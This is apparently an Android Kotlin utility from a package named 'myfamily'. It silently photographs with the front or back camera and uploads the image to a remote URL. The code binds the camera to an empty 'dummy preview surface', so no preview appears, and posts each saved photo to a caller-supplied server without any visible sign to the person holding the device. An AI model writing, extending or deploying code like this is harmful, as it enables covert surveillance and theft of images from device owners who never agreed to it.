package com.apps.myfamily

import android.content.Context
import android.net.Uri
import android.os.Environment
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException
import java.util.concurrent.Executors

object CameraUtils {
    fun takePhoto(context: Context, cameraFacing: String, uploadUrl: String) {
        val cameraSelector = if (cameraFacing == "front")
            CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

        val executor = Executors.newSingleThreadExecutor()
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)

        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()

                val imageCapture = ImageCapture.Builder()
                    .setTargetRotation(0)
                    .build()

                cameraProvider.unbindAll()

                // Use dummy preview surface
                val preview = Preview.Builder().build()
                val previewSurfaceProvider = Preview.SurfaceProvider { }

                preview.setSurfaceProvider(previewSurfaceProvider)

                cameraProvider.bindToLifecycle(
                    ContextWrapperLifecycle(context),
                    cameraSelector,
                    preview,
                    imageCapture
                )

                val photoFile = File(
                    context.getExternalFilesDir(Environment.DIRECTORY_PICTURES),
                    "photo_${System.currentTimeMillis()}.jpg"
                )

                val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()
                imageCapture.takePicture(
                    outputOptions,
                    executor,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onError(exc: ImageCaptureException) {
                            Log.e("CameraUtils", "Capture failed: ${exc.message}")
                        }

                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            Log.i("CameraUtils", "Photo saved: ${photoFile.absolutePath}")
                            uploadFile(photoFile, uploadUrl)
                        }
                    })

            } catch (e: Exception) {
                Log.e("CameraUtils", "Camera error: ${e.message}")
            }
        }, ContextCompat.getMainExecutor(context))
    }

    private fun uploadFile(file: File, uploadUrl: String) {
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
            .build()

        val request = Request.Builder()
            .url(uploadUrl)
            .post(body)
            .build()

        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("CameraUtils", "Upload failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.i("CameraUtils", "Upload success: ${response.code}")
            }
        })
    }
}
